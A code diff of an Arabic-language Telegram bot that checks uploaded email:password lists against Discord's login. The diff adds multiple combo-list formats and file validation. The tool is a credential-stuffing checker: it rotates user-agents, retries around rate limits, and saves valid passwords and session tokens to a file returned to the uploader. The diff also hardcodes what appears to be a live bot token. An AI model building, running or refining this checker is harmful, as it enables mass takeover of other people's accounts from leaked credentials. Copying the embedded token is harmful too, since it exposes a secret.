@@ -10,10 +10,12 @@ import re
 from datetime import datetime
 from typing import List, Dict, Tuple
 import random
+import aiohttp
+import aiofiles
 
 # ============= إعدادات البوت =============
 BOT_TOKEN = "8818745155:AAFNGU9SIbkKxzcZN62khYE-zAqiUDEUaSw"  # ضع توكن البوت هنا
-ADMIN_IDS = [8703458182]  # ✅ ضع معرفات الأدمن هنا (أرقام فقط)
+ADMIN_IDS = [8703458182]  # ضع معرفات الأدمن هنا
 
 # ============= القيم الثابتة =============
 X_Super_Properties = {
@@ -24,7 +26,6 @@ X_Super_Properties = {
 
 # ============= دالة التحقق من الأدمن =============
 def is_admin(user_id: int) -> bool:
-    """التحقق مما إذا كان المستخدم أدمن"""
     return user_id in ADMIN_IDS
 
 # ============= كلاس المفحص =============
@@ -41,11 +42,9 @@ class DiscordChecker:
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
         ]
         
     def get_headers(self) -> dict:
-        """توليد الهيدرات المطلوبة مع User-Agent عشوائي"""
         user_agent = random.choice(self.user_agents)
         headers = {
             'User-Agent': user_agent,
@@ -55,17 +54,10 @@ class DiscordChecker:
             'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
             'Origin': 'https://discord.com',
             'Referer': 'https://discord.com/',
-            'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
-            'Sec-Ch-Ua-Mobile': '?0',
-            'Sec-Ch-Ua-Platform': '"Windows"',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin'
         }
         return headers
 
     def check_account(self, email: str, password: str, retry_count: int = 0) -> Tuple[bool, str, str]:
-        """التحقق من حساب واحد مع إعادة المحاولة عند الـ Rate Limit"""
         try:
             if retry_count > 0:
                 wait_time = min(2 ** retry_count, 60)
@@ -93,7 +85,7 @@ class DiscordChecker:
                 if retry_count < 5:
                     return self.check_account(email, password, retry_count + 1)
                 else:
-                    return False, "Rate Limited (max retries)", "⛔"
+                    return False, "Rate Limited", "⛔"
             
             try:
                 response_data = json.loads(login_res)
@@ -125,15 +117,10 @@ class DiscordChecker:
                 
             return False, "Unknown Error", "❌"
             
-        except http.client.HTTPException as e:
-            return False, f"HTTP Error: {str(e)}", "❌"
-        except TimeoutError:
-            return False, "Connection Timeout", "❌"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}", "❌"
 
     async def process_accounts(self, accounts: List[Tuple[str, str]], progress_callback=None) -> List[Dict]:
-        """معالجة قائمة الحسابات"""
         self.is_running = True
         self.start_time = time.time()
         self.total = len(accounts)
@@ -183,13 +170,12 @@ class DiscordChecker:
                 await progress_callback(progress)
             
             if idx < len(accounts):
-                await asyncio.sleep(random.uniform(0.3, 0.8))
+                await asyncio.sleep(random.uniform(0.5, 1.0))
         
         self.is_running = False
         return self.results
 
     def generate_results_file(self, filename: str = None) -> str:
-        """توليد ملف النتائج"""
         if not filename:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"discord_results_{timestamp}.txt"
@@ -215,7 +201,6 @@ class DiscordChecker:
                         f.write(f"[{idx}] Email: {result['email']}\n")
                         f.write(f"    Password: {result['password']}\n")
                         f.write(f"    Token: {result['token']}\n")
-                        f.write(f"    Status: {result['status']}\n")
                         f.write("-" * 70 + "\n")
             
             if self.invalid > 0:
@@ -233,7 +218,6 @@ class DiscordChecker:
 # ============= دوال بوت التيليجرام =============
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """رسالة الترحيب - متاحة للجميع"""
     user_id = update.effective_user.id
     is_admin_user = is_admin(user_id)
     
@@ -261,14 +245,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "👤 *مرحباً بك!*\n"
             "📤 أرسل لي ملف نصي يحتوي على الحسابات\n"
             "📝 الصيغة: `email:password`\n"
-            "📌 كل حساب في سطر منفصل\n\n"
-            "📊 سأقوم بفحصهم وارسال النتائج"
+            "📌 كل حساب في سطر منفصل"
         )
     
     await update.message.reply_text(welcome_msg, parse_mode='Markdown')
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """معالجة الملف المرسل - متاحة للجميع"""
+    """معالجة الملف المرسل - نسخة محسنة"""
     user_id = update.effective_user.id
     
     # تسجيل المستخدم
@@ -276,43 +259,89 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.bot_data['users'] = set()
     context.bot_data['users'].add(user_id)
     
+    # رسالة مؤقتة
+    status_msg = await update.message.reply_text("📥 *جاري تحميل الملف...*", parse_mode='Markdown')
+    
     try:
-        file = await update.message.document.get_file()
-        file_path = f"accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{user_id}.txt"
-        await file.download_to_drive(file_path)
+        # الحصول على الملف
+        document = update.message.document
         
-        with open(file_path, 'r', encoding='utf-8') as f:
+        # التحقق من نوع الملف
+        if not document.file_name.endswith(('.txt', '.csv')):
+            await status_msg.edit_text(
+                "❌ *نوع الملف غير مدعوم!*\n"
+                "📝 يرجى إرسال ملف `.txt` أو `.csv`",
+                parse_mode='Markdown'
+            )
+            return
+        
+        # تحميل الملف بطريقة آمنة
+        file = await context.bot.get_file(document.file_id)
+        
+        # إنشاء اسم ملف مؤقت
+        temp_filename = f"accounts_{user_id}_{int(time.time())}.txt"
+        
+        # تحميل الملف
+        await file.download_to_drive(temp_filename)
+        
+        # التحقق من حجم الملف
+        file_size = os.path.getsize(temp_filename)
+        if file_size == 0:
+            os.remove(temp_filename)
+            await status_msg.edit_text("❌ *الملف فارغ!*", parse_mode='Markdown')
+            return
+        
+        if file_size > 10 * 1024 * 1024:  # 10 MB
+            os.remove(temp_filename)
+            await status_msg.edit_text("❌ *الملف كبير جداً! (الحد الأقصى 10 ميجابايت)*", parse_mode='Markdown')
+            return
+        
+        # قراءة الملف
+        with open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
         
+        # حذف الملف المؤقت
+        os.remove(temp_filename)
+        
+        # استخراج الحسابات
         accounts = []
         lines = content.split('\n')
         for line in lines:
             line = line.strip()
+            # دعم عدة صيغ: email:pass أو email|pass أو email,pass
             if ':' in line and not line.startswith('#'):
                 parts = line.split(':', 1)
                 if len(parts) == 2:
                     email = parts[0].strip()
                     password = parts[1].strip()
-                    if email and password:
+                    if email and password and '@' in email:
+                        accounts.append((email, password))
+            elif '|' in line and not line.startswith('#'):
+                parts = line.split('|', 1)
+                if len(parts) == 2:
+                    email = parts[0].strip()
+                    password = parts[1].strip()
+                    if email and password and '@' in email:
                         accounts.append((email, password))
         
-        os.remove(file_path)
-        
         if not accounts:
-            await update.message.reply_text(
+            await status_msg.edit_text(
                 "❌ *لم يتم العثور على حسابات صالحة في الملف!*\n\n"
-                "📝 تأكد من الصيغة: `email:password`",
+                "📝 الصيغة المدعومة: `email:password`\n"
+                "📌 كل حساب في سطر منفصل",
                 parse_mode='Markdown'
             )
             return
         
-        await update.message.reply_text(
+        # تحديث رسالة الحالة
+        await status_msg.edit_text(
             f"🚀 *بدأت عملية الفحص!*\n\n"
             f"📊 عدد الحسابات: `{len(accounts)}`\n"
             f"⏳ جاري الفحص... سأرسل التحديثات",
             parse_mode='Markdown'
         )
         
+        # بدء الفحص
         checker = DiscordChecker()
         last_update_time = 0
         
@@ -339,10 +368,13 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 await update.message.reply_text(progress_msg, parse_mode='Markdown')
         
+        # تنفيذ الفحص
         await checker.process_accounts(accounts, send_progress)
         
+        # توليد ملف النتائج
         results_file = checker.generate_results_file()
         
+        # إحصائيات النهائية
         success_rate = (checker.valid / checker.total * 100) if checker.total > 0 else 0
         elapsed = int(time.time() - checker.start_time)
         
@@ -358,17 +390,19 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await update.message.reply_text(summary, parse_mode='Markdown')
         
+        # إرسال الملف
         with open(results_file, 'rb') as f:
             await update.message.reply_document(
                 document=f,
-                filename=results_file,
+                filename=os.path.basename(results_file),
                 caption="📄 *ملف النتائج الكامل*\n✅ صالح | ❌ غير صالح",
                 parse_mode='Markdown'
             )
         
+        # حذف الملف المؤقت
         os.remove(results_file)
         
-        # إرسال إشعار للأدمن
+        # إشعار للأدمن
         for admin_id in ADMIN_IDS:
             try:
                 await context.bot.send_message(
@@ -381,16 +415,24 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
             except:
                 pass
-        
+                
     except Exception as e:
-        await update.message.reply_text(f"❌ *حدث خطأ:* `{str(e)}`", parse_mode='Markdown')
+        error_msg = str(e)
+        await status_msg.edit_text(
+            f"❌ *حدث خطأ:*\n"
+            f"`{error_msg[:200]}`\n\n"
+            f"💡 تأكد من:\n"
+            f"• صحة الملف\n"
+            f"• وجود حسابات بالصيغة الصحيحة\n"
+            f"• إعادة المحاولة",
+            parse_mode='Markdown'
+        )
+        print(f"Error in handle_file: {e}")
 
-# ============= أوامر الأدمن فقط =============
+# ============= أوامر الأدمن =============
 
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """إحصائيات البوت - للأدمن فقط"""
     user_id = update.effective_user.id
-    
     if not is_admin(user_id):
         await update.message.reply_text("⛔ *هذا الأمر مخصص للأدمن فقط!*", parse_mode='Markdown')
         return
@@ -409,14 +451,11 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(stats_msg, parse_mode='Markdown')
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """إرسال رسالة للجميع - للأدمن فقط"""
     user_id = update.effective_user.id
-    
     if not is_admin(user_id):
         await update.message.reply_text("⛔ *هذا الأمر مخصص للأدمن فقط!*", parse_mode='Markdown')
         return
     
-    # الحصول على الرسالة
     message_text = update.message.text.replace('/broadcast', '').strip()
     
     if not message_text:
@@ -436,7 +475,6 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sent = 0
     failed = 0
     
-    # إرسال رسالة التحميل
     status_msg = await update.message.reply_text(
         f"📤 *جاري إرسال الرسالة...*\n"
         f"👥 المستخدمين: `{len(users)}`",
@@ -451,7 +489,7 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode='Markdown'
             )
             sent += 1
-            await asyncio.sleep(0.1)  # تجنب الـ Rate Limit
+            await asyncio.sleep(0.1)
         except:
             failed += 1
     
@@ -463,9 +501,7 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """قائمة المستخدمين - للأدمن فقط"""
     user_id = update.effective_user.id
-    
     if not is_admin(user_id):
         await update.message.reply_text("⛔ *هذا الأمر مخصص للأدمن فقط!*", parse_mode='Markdown')
         return
@@ -476,7 +512,7 @@ async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ *لا يوجد مستخدمين مسجلين*", parse_mode='Markdown')
         return
     
-    users_list = "\n".join([f"🆔 `{u}`" for u in list(users)[:20]])  # عرض أول 20
+    users_list = "\n".join([f"🆔 `{u}`" for u in list(users)[:20]])
     
     users_msg = (
         f"👥 *قائمة المستخدمين*\n"
@@ -491,7 +527,6 @@ async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(users_msg, parse_mode='Markdown')
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """إيقاف العملية - متاحة للجميع"""
     await update.message.reply_text(
         "⏹️ *تم إيقاف العملية*\n"
         "📊 يمكنك البدء من جديد بإرسال ملف آخر",
@@ -499,7 +534,6 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """مساعدة - متاحة للجميع"""
     user_id = update.effective_user.id
     is_admin_user = is_admin(user_id)
     
@@ -526,10 +560,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(help_msg, parse_mode='Markdown')
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """معالج الأخطاء"""
     print(f"❌ حدث خطأ: {context.error}")
     
-    # إرسال خطأ للأدمن
     for admin_id in ADMIN_IDS:
         try:
             await context.bot.send_message(
@@ -545,14 +577,12 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ============= التشغيل الرئيسي =============
 
 def main():
-    """تشغيل البوت"""
     if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
         print("❌ خطأ: يرجى وضع توكن البوت في المتغير BOT_TOKEN")
         return
     
     if not ADMIN_IDS:
         print("⚠️ تحذير: لم يتم تحديد أي أدمن!")
-        print("📝 أضف معرفات الأدمن في قائمة ADMIN_IDS")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
@@ -560,13 +590,11 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop))
     app.add_handler(CommandHandler("help", help_command))
-    
-    # أوامر الأدمن
     app.add_handler(CommandHandler("stats", stats))
     app.add_handler(CommandHandler("broadcast", broadcast))
     app.add_handler(CommandHandler("users", users_list))
     
-    # معالجة الملفات والرسائل
+    # معالجة الملفات
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     
     # معالج الأخطاء
@@ -574,7 +602,6 @@ def main():
     
     print("🤖 Bot is running...")
     print(f"👑 Admins: {ADMIN_IDS}")
-    print("📤 أرسل ملف txt يحتوي على الحسابات")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
